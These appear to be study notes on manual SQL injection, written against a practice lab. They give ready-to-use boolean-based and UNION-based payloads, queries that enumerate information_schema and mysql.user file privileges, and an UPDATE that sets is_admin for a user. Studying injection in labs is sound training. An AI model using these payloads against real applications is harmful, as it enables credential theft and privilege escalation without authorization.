# Manual SQL
This id parameter is attached to a certain username (login name) and password which are being chosen from the database.  
This how it would look in terms of SQL language:

`select login_name, password from table where id=` 

![](Manual%20SQL/image.png)

Update DB
---------

```text-plain
update user set is_admin=1 where lower_name="admin1";
```

to modify a value of column `is_admin` to 1 in the table `user`, and use `where` to specify it to modify only one field.

Boolean based
-------------

Now, fix the query by putting `--+`

At this point, it is important to understand that in SQL language we can actually use =, <, > to compare the values. 

Try putting different comparison values in your link

`10.10.77.93/sqli-labs/Less-8/?id=1' OR 1 < 2 --+` = True

or `10.10.77.93/sqli-labs/Less-8/?id=1' OR 1 > 2 --+` = False

`id=1' AND (ascii(substr((select database()),1,1))) = 115 --+` 

Union-based SQLi
----------------

union-based SQLi is a SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:

determine the number of columns you can retrieve.

`SELECT 1, 2 FROM usernames UNION SELECT 1, 2 FROM passwords`

![](Manual%20SQL/1_image.png) ![](Manual%20SQL/2_image.png)

Finally, we can start getting some valuable information. Simply replace some null values with SQL keywords to get information about the database.   
Here's a small list of thing you'd want to retrieve:

1\. database()

2\. user()

3\. @@version

4\. username

5\. password

6\. table\_name

7\. column\_name

FIle write
----------

`" union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -`

adjust the number of columns

Methodology for manual SQLI:
----------------------------

[https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/) 

retrieve database name:

```text-plain
1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata --
```

Retrieve table names::

```text-plain
' UNION SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="webapp" '
```

Retrieve column names:

```text-plain
' UNION SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="queue" '
```